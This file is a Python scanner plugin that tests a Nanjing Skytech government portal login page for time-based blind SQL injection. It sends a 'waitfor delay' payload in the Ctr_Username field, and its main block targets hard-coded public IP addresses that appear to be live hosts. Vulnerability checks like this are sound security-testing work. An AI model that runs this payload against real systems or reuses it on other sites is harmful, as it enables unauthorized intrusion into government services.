#!usr/bin/env python
# *-* coding:utf-8 *-*

'''
name: 南京擎天政务系统SQL注入(一)
author: yichin
refer: http://www.wooyun.org/bugs/wooyun-2015-0100235
description:
    webpages/login_ex.aspx POST parameter:Ctr_Username
'''

import time
import re

def assign(service, arg):
    if service == 'skytech':
        return True, arg

def audit(arg):
    url = arg + 'webpages/login_ex.aspx'
    content_type = 'Content-Type: application/x-www-form-urlencoded'
    # proxy = ('127.0.0.1', 8887)
    #获取viewstate等
    code, head, res, err, _ = curl.curl2(url, referer=url)
    if code != 200:
        return False
    m = re.search(r'id="__VIEWSTATE"\s*value="([a-zA-Z0-9+/=]*)"',res)
    #print res
    if not m:
        return False
    viewstate = m.group(1).replace('=','%3D')
    m = re.search(r'id="__EVENTVALIDATION"\s*value="([a-zA-Z0-9+/=]*)"', res)
    if not m:
        return False
    eventvalidation = m.group(1).replace('=','%3D')
    m = re.search(r'id="__VIEWSTATEGENERATOR"\s*value="([a-zA-Z0-9+/=]*)"', res)
    if not m:
        return False
    viewstategenerator = m.group(1).replace('=','%3D')
    post_delay_0 = '__VIEWSTATE={viewstate}&__VIEWSTATEGENERATOR={viewstategenerator}&__EVENTVALIDATION={eventvalidation}&Ctr_Username=test%27;waitfor%20delay%20%270:0:0%27--&Ctr_Password=asdfds&log.x=21&log.y=12'.format(
        viewstate = viewstate,
        viewstategenerator = viewstategenerator,
        eventvalidation = eventvalidation
    )
    #构造post表单
    post_delay_0 = post_delay_0.replace('+', '%2B').replace('/', '%2F')
    post_delay_5 = post_delay_0.replace('0:0:0', '0:0:5')
    t1 = time.time()
    code1, head, res, err, _ = curl.curl2(url, post=post_delay_0, referer=url)
    t2 = time.time()
    code2, head, res, err, _ = curl.curl2(url, post=post_delay_5, referer=url)
    t3 = time.time()
    if code1==code2!=0 and (t1+t3 - (2*t2)) > 3:
        security_hole('SQL injection: ' + url + ' parameter:Ctr_Username')

if __name__ == '__main__':
    from dummy import *
    audit(assign('skytech', 'http://58.222.202.135:81/')[1])
    # audit(assign('skytech', 'http://61.178.185.50/mqweb/')[1])